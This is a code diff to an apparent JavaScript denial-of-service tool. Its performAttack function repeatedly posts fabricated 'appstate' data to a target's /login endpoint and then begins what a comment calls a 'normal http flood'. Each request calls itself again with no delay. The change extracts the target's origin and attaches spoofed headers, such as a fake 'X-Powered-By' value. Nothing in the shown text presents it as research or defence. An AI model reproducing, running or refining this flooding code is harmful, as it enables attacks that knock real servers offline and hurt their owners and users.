@@ -140,25 +140,32 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         "X-Powered-By": "PHP/7.4.3",
     };
 
-//dumping attack if endpoint body exist
+    //dumping attack if endpoint body exist
 
-    axios.post(url + "/login", {
-        state: fakeState(),
-    }).then((response) => {
-        if (response.status === 200) {
-            console.log(rainbow("Dumped Fake Appstate Success ✓ (200)"))
+    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login",
+        {
+            state: fakeState(),
+        },
+        {
+            headers: headersForRequest,
         }
-        requestsSent++;
-        checkCompletion(requestsSent);
-        setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
-    })
+    ).then((response) => {
+            if (response.status === 200) {
+                console.log(rainbow("Dumped Fake Appstate Success ✓ (200)"));
+            }
+            requestsSent++;
+            checkCompletion(requestsSent);
+            setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
+        })
     .catch((err) => {
         requestsSent++;
         checkCompletion(requestsSent);
         setTimeout(() => performAttack(url, agent, continueAttack, requestsSent, checkCompletion), 0);
     });
 
-//normal http flood
+
+
+    //normal http flood
 
     axios
     .get(url,
